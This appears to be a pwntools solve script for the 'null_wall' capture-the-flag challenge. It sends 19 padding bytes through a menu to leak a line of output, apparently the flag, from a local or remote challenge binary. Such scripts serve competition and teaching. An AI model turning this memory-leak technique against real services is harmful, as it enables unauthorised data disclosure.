#!/usr/bin/env python3

from pwn import *

exe = ELF("./null_wall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("nullwall.challs.m0lecon.it", 1337)

    return r


def main():
    r = conn()

    r.sendlineafter(b'Choose an option: ', b'1')
    r.sendlineafter(b'Share some thoughts: ', b'A' * 19)
    r.sendlineafter(b'Choose an option: ', b'2')

    print(r.recvlinesS(3)[-1])


if __name__ == "__main__":
    main()
